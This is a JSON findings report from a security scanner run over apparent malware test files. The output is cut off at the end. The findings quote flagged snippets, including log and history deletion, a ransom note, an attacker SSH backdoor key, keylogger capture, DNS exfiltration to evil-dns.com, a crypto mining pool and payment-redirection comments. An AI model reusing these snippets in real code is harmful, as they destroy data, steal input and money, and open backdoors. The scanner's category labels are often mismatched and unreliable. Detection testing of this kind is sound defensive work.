[
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.765016",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "797cfa15-4783-4862-b686-3c7b27b9193f",
    "last_modified": "",
    "line_number": 234,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.765016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/home/user/.bash_history')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.766016",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "50e0af6e-e002-4b84-b916-51f04a7fe39f",
    "last_modified": "",
    "line_number": 237,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.766016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove(file_path)",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.767016",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "eb461a56-2feb-4ff5-96ad-48fe6ef20393",
    "last_modified": "",
    "line_number": 357,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T19:13:40.767016"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
    "column": 48,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.770018",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "2239cb01-aa04-457e-b21f-c805b70fc931",
    "last_modified": "",
    "line_number": 373,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.770018"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.772015",
    "data_classification": "UNKNOWN",
    "debt_category": "SECURITY_ISSUE",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "e44661e2-c3ad-402d-8b8f-0092b6b632e7",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-secrets-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Move secrets to environment variables or secure vault services.",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "VULNERABILITY",
    "update_date": "2025-08-11T19:13:40.772015"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.779013",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "4db7a593-73d4-443d-9069-a5da03d0f25c",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.779013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
    "column": 55,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.779013",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "2f9e3847-c63c-42af-91b0-0235d8cc70d1",
    "last_modified": "",
    "line_number": 102,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.779013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
    "column": 16,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.780014",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "5760d542-2af0-488b-ae8c-d63724f1499f",
    "last_modified": "",
    "line_number": 459,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.780014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "password_data = ''.join(captured_keys[-50:])",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.781055",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "a6937cf7-1cfd-4924-b8d2-6e3f132c7311",
    "last_modified": "",
    "line_number": 462,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.781055"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "app.run(host='0.0.0.0', port=80)",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.782018",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "62a7b0ff-2d00-4e22-8a0c-aa7f20c63b7a",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.782018"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
    "column": 10,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.782018",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "97d19290-3896-4da1-b475-d1fd090712ad",
    "last_modified": "",
    "line_number": 251,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.782018"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.784019",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "8654f648-178b-4aa1-8d84-a8086f3f9279",
    "last_modified": "",
    "line_number": 34,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.784019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.784019",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "531ef85c-87b6-41ed-9b95-8f07d3aa3464",
    "last_modified": "",
    "line_number": 97,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.784019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "data = f\"block_data_{nonce}\".encode()",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.784019",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "c5dcf1ae-9c1a-4dd9-a4f5-09275a19eb01",
    "last_modified": "",
    "line_number": 262,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.784019"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
    "column": 36,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.785014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "392fbf50-16f4-48bc-853a-9c40cdbc0623",
    "last_modified": "",
    "line_number": 343,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.785014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"{ip}: {open_ports}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.785014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "76a47c1b-e454-4954-8478-f4ac32856f0f",
    "last_modified": "",
    "line_number": 513,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.785014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "ip = f\"{network}.{i}\"",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.785014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "91bf03f0-0a7e-46c8-985c-818d2813c72c",
    "last_modified": "",
    "line_number": 519,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.785014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "full_domain = f\"{sub}.{domain}\"",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.786014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "48b42f61-9949-49f9-8bca-0e1e7e03958e",
    "last_modified": "",
    "line_number": 558,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.786014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.786014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "7257036d-f67f-47ea-86dd-f07cf8a04c90",
    "last_modified": "",
    "line_number": 560,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.786014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"SNMP access with community: {community}\")",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.786014",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "34779a74-3351-45fb-a490-d9702c64f36d",
    "last_modified": "",
    "line_number": 586,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T19:13:40.786014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.803013",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "cc482522-aa56-484f-bfef-dae828179dda",
    "last_modified": "",
    "line_number": 11,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.803013"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(amount, developer_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.804014",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "a5952ae0-7092-4634-9936-ba40e1e31eba",
    "last_modified": "",
    "line_number": 76,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "15cec90e-046d-4aed-83e9-53377775d0db",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T19:13:40.804014"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payments to admin account during off-hours",
    "column": 15,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T19:13:40.804014",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "6c261c5e-4a85-4111-bdaa-9f14e4119d6f",
    "last_modified": "",
    "line_number": 93,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
